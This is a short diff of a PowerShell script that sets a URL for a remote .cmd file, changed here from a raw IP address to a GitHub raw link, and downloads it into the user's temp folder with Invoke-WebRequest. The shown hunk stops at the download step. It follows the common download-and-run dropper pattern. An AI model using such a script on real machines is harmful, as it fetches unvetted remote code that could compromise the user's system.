@@ -2,10 +2,10 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # Set the URL for the CMD file
-$cmdUrl = "http://195.174.136.4/test/ION.cmd"
+$cmdUrl = "https://github.com/nizhenets/test/raw/main/test.cmd"
 
 # Define the temporary file path
-$tempPath = "$env:TEMP\ION.cmd"
+$tempPath = "$env:TEMP\test.cmd"
 
 # Download the CMD file
 Invoke-WebRequest -Uri $cmdUrl -OutFile $tempPath
